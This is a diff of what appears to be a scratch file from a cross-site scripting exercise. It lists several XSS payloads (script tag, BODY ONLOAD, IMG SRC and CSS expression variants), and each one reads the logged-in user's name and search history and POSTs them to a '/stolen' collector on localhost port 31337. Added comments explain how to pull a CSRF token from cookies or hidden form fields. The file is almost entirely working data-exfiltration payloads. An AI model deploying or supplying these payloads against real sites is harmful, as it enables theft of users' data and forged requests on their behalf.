@@ -38,19 +38,30 @@ xhr.setRequestHeader('Content-Type', '');xhr.send(JSON.stringify({value: value})
 // 		alert(http.responseText);
 // 	}
 // }
+//token
+// network tab -> load this page -> headers -> sending cookie with csrf token send -> use document.cookie
+//
+// or
+//
+// look inside the form -> hidden csrf token with value -> POST request under network , see the form data from the hidden field.
+
+//ajax to get request
 window.location.href=send;
 
-ORIG:
+Number 1:
 <script>window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()}</script>
-
-
+Number 2:
+<BODY ONLOAD="var xhr = new XMLHttpRequest();var url='http://127.0.0.1:31337/stolen';var params='user='+String(document.getElementById('logged-in-user').innerHTML)+'&last_search='+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open('POST', send, true);console.log(send);xhr.send()">
+Number 3:
 
 <!---->window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()}<!---->
 
 <IMG SRC="(javascript:window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send())}">
 
+<BODY ONLOAD="console.log(document.getElementById('logged-in-user').innerHTML)">
 
-<BODY ONLOAD=(window.onload = function() {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()})>
+
+<BODY ONLOAD="var xhr = new XMLHttpRequest();var url='http://127.0.0.1:31337/stolen';var params='user='+String(document.getElementById('logged-in-user').innerHTML)+'&last_search='+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open('POST', send, true);console.log(send);xhr.send()">
 
 
 <DIV STYLE="width: expression(var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send())">
